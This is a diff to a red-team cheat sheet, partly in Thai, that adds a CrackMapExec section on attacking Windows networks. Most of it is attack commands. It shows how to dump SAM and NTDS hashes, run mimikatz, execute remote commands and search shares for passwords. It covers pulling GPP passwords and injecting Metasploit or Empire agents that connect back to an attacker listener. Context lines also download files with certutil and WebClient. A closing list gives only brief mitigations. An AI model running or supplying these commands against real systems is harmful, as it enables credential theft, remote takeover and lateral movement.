@@ -188,6 +188,75 @@ Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename
 (New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename")  
 certutil.exe -urlcache -split -f https://myserver/filename outputfilename  
 
+# CrackMapExec
+## List of command
+cme --help  
+## Scanning smb port
+cme smb <IP Range>  
+## Remote to target (Check credential correct)
+cme smb 192.168.100.100 -u user -p p@ssw0rd  
+## Remote to taget and dump sam file
+cme smb 192.168.100.100 -u user -p p@ssw0rd --sam  
+## Remote to taget and dump ntds file (on AD)
+cme smb 192.168.100.100 -u user -p p@ssw0rd --ntds  
+## Execute command on remote
+cme smb 192.168.100.100 -u user -p p@ssw0rd -x <command>  
+## List all module plugin that can use
+cme smb 192.168.100.100 -L  
+## Using mimikatz module
+cme smb 192.168.100.100 -u user -p p@ssw0rd -M mimikatz  
+## List all group on remote
+cme smb 192.168.100.100 -u user -p p@ssw0rd --groups  
+## List all members in specific group on remote
+cme smb 192.168.100.100 -u user -p p@ssw0rd --groups 'Domain Admins'  
+## List share drive ใดๆของ target
+cme smb 192.168.100.100 -u user -p p@ssw0rd --shares  
+## เข้าไปใน share ใดๆ
+cme smb 192.168.100.100 -u user -p p@ssw0rd --spider <sharename>  
+## เข้าไปใน share ใดๆ และ filter ให้เหลือไฟล์ที่ชื่อว่า pass
+cme smb 192.168.100.100 -u user -p p@ssw0rd --spider <sharename> --pattern pass  
+## เข้าไปใน share ใดๆ และ filter ให้เหลือไฟล์ที่มีคำว่า pass
+cme smb 192.168.100.100 -u user -p p@ssw0rd --spider <sharename> --pattern pass --content  
+## หา password ใน group object policy
+cme smb 192.168.100.100 -u user -p p@ssw0rd --spider <sharename> -M gpp_password  
+## สั่งให้ติดต่อกลับไปยัง VNC Server ของเรา
+cme smb <target_IP> -M invoke_vnc -o PORT=5500 PASSWORD=<password of vnc>  
+## Connect to empire framework
+ที่ empire ทำ listener ไว้ก่อน ชื่ออะไรก็ได้  
+cme smb 192.168.100.100 -u user -p p@ssw0rd -M empire_exec -o LISTENER=ชื่อที่เราทำ listener ไว้  
+จากนั้นกลับไปที่ empire แล้วใช้งาน agents ได้ปกติเลยครับ  
+## Connect to metasploit framework
+ที่ Metasploit ทำ listener ไว้ก่อน (exploit -j)  
+cme smb 192.168.100.100 -u user -p p@ssw0rd -M met_inject -o LHOST=<Listener IP> LPORT=<Listener PORT>  
+## Scanning MSSQL port
+cme mssql <target_IP>  
+## Run command from MSSQL (ใช้ powershell launcher)
+cme mssql <target_IP> -x <command>  
+## Scanning winrm support
+cme winrm 192.168.100.0/24  
+cme winrm 192.168.100.0/24 -u admin -p p@ssw0rd  
+## cmedb เป็นคำสั่งที่จะเข้าไปใน db ที่ cme เก็บ log ทุกอย่างรวมถึง credential ไว้
+cmedb  
+## List credential ทั้งหมดที่เคย dump ไว้
+(cmedb)> creds  
+## เข้าไปดูส่วนเฉพาะของ smb
+(cmedb)> proto smb  
+## List host ที่เคยเก็บข้อมูล
+(cmedb)(default)(smb)> hosts  
+## แสดง dump cred ของเฉพาะ host นั้นๆ
+(cmedb)(default)(smb)> hosts 1  
+## List group ที่เป็น admins
+(cmedb)(default)(smb)> groups admins  
+## ดู member ของ group นั้นๆ
+(cmedb)(default)(smb)> groups <id>  
+## Mitigation
+- Account lockout policy  
+- Logging  
+- Segmentation  
+- Powershell logging  
+- Microsoft ATA  
+- Microsoft LAPS  
+
 # On AD
 powershell "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()"  
 powershell "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"  
@@ -195,7 +264,6 @@ powershell "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(
 powershell "get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf"  
 ## Find admin group
 powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '\*admin\*'}"  
-
 
 
 # Resource::
